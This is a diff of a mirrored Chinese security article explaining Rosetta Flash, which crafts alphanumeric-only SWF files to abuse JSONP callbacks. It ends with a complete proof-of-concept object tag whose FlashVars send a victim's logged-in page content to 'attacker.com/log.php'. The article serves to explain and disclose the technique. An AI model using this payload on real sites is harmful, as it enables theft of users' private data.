@@ -3,7 +3,7 @@
 			<head>
 			     <title>上传文件的陷阱II 纯数字字母的swf是漏洞么? - mramydnei</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/2554">http://drops.wooyun.org/tips/2554</a></h1>
 				
@@ -47,25 +47,25 @@
 
 <p>这种纯数字字母的swf的制作原理,主要就是将一般的swf二进制内容通过zlib压缩后再进行输出。 使用点对点的哈弗曼编码将非法字符映射为合法字符。当然了,严格的来说这种做法并不能被称作 是真正意义上压缩。</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411110250867.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411110250867.png" alt="enter image description here"></p>
 
 <p>通常,一个Flash文件既可以是没有被压缩过的(神奇的FWC字节),也可以是经过zlib(神奇的 CWS字节)或LZMA(神奇的ZWS字节)压缩过的。</p>
 
 <p>SWF的头格式如下图所示:</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411111388123.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411111388123.png" alt="enter image description here"></p>
 
 <p>由于Flash解析器具有极高的自由度(如下图)和忽略无效字节的特性,借助这种特性就可以让我们得到我们想要的字符。</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411150149549.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411150149549.png" alt="enter image description here"></p>
 
 <p>首先我们要搞定zlib头中经过DEFLATE(同时使用了LZ77与哈夫曼编码的一种无损数据压缩算法)压缩过的前两个字节。我使用下面的方法搞定了其中的第一个字节:</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411151460335.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411151460335.png" alt="enter image description here"></p>
 
 <p>再通过这种方式搞定了其第二个字节:</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411152696537.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411152696537.png" alt="enter image description here"></p>
 
 <p>虽然不存在太多这样的组合(两个字节)可以同时通过CMF+CINFO+FLG,但是0x68 0x43=hc恰好是符合的。</p>
 
@@ -77,7 +77,7 @@
 
 <p>在这里我们就使用了一种比较聪明的做法来获取由<code>[a-zA-Z0-9_\.]</code>构成的checksum。</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411153758370.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411153758370.png" alt="enter image description here"></p>
 
 <p>对于我们来说,不论是S1还是S2都必须是由数字字母来构成的。</p>
 
@@ -85,7 +85,7 @@
 
 <p>而且这些字节是会被忽略的。这一特性帮助我搞定了S1和S2。我称之为Sleds + Deltas 技术。</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411155036970.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411155036970.png" alt="enter image description here"></p>
 
 <p>我们需要做的就是不停添加高位的seld直到出现一个单字节可以让S1模数溢出。</p>
 
@@ -95,7 +95,7 @@
 
 <p>现在让我们使用哈夫曼的魔法将所有的一切转换成我们需要的<code>[a-zA-Z0-9_\.]</code>吧。</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411160054665.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411160054665.png" alt="enter image description here"></p>
 
 <p>在这里我们使用了两个哈夫曼encoder来提高我们程序的效率。</p>
 
@@ -103,19 +103,19 @@
 
 <p>最终,按字节输出的效果会是这样:</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411161348401.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411161348401.png" alt="enter image description here"></p>
 
 <p>最终我们得到我们一直期盼的纯数字字母的SWF:</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411162459893.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411162459893.png" alt="enter image description here"></p>
 
 <p>相关POC(AS2代码):</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411163214441.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411163214441.png" alt="enter image description here"></p>
 
 <p>我们将其编译为swf(未压缩),再用Rosetta Flash对其进行转换,最终得到:</p>
 
-<p><img src="http://static.wooyun.org/201407/2014071411164310665.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2014071411164310665.png" alt="enter image description here"></p>
 
 <pre><code>&lt;object type="application/x-shockwave-flash" data="https://vulnerable.com/endpoint? callback=CWSMIKI0hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333swW0ssG03sDDtDDDt0333333Gt333swwv3wwwFPOHtoHHvwHHFhH3D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNqdIbeUUUfV13333333333333333s03sDTVqefXAxooooD0CiudIbEAt33swwEpt0GDG0GtDDDtwwGGGGGsGDt33333www033333GfBDTHHHHUhHHHeRjHHHhHHUccUSsgSkKoE5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YNqdIbe13333333333sUUe133333Wf03sDTVqefXA8oT50CiudIbEAtwEpDDG033sDDGtwGDtwwDwttDDDGwtwG33wwGt0w33333sG03sDDdFPhHHHbWqHxHjHZNAqFzAHZYqqEHeYAHlqzfJzYyHqQdzEzHVMvnAEYzEVHMHbBRrHyVQfDQflqzfHLTrHAqzfHIYqEqEmIVHaznQHzIIHDRRVEbYqItAzNyH7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt33swwEDt0GGDDDGptDtwwG0GGptDDww0GDtDDDGGDDGDDtDD33333s03GdFPXHLHAZZOXHrhwXHLhAwXHLHgBHHhHDEHXsSHoHwXHLXAwXHLxMZOXHWHwtHtHHHHLDUGhHxvwDHDxLdgbHHhHDEHXkKSHuHwXHLXAwXHLTMZOXHeHwtHtHHHHLDUGhHxvwTHDxLtDXmwTHLLDxLXAwXHLTMwlHtxHHHDxLlCvm7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtuwt3sG33ww0sDtDt0333GDw0w33333www033GdFPDHTLxXThnohHTXgotHdXHHHxXTlWf7D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwwWtD333wwG03www0GDGpt03wDDDGDDD 33333s033GdFPhHHkoDHDHTLKwhHhzoDHDHTlOLHHhHxeHXWgHZHoXHT HNo4D0Up0IZUnnnnn nnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt33wwE03GDDGwGGDDGDwGtwDtwDDGGDDtGDwwGw0GDDw0w33333www033GdFPHLRDXthHHHLHqeeorHthHHHXDhtxHHHLravHQxQHHHOnHDHyMIuiCyIYEHWSsgHmHKcskHoXHLHwhHHvoXHLhAotHthHHHLXAoXHLxUvH1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SnnwWNqdIbe133333333333333333WfF03sTeqefXA888oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo888888880Nj0h" style="display: none"&gt; &lt;param name="FlashVars" value="url=https://vulnerable.com/account/sensitive_content_logged_in&amp;exfiltrate=http://attacker.com/log.php"&gt; &lt;/object&gt;
 </code></pre>
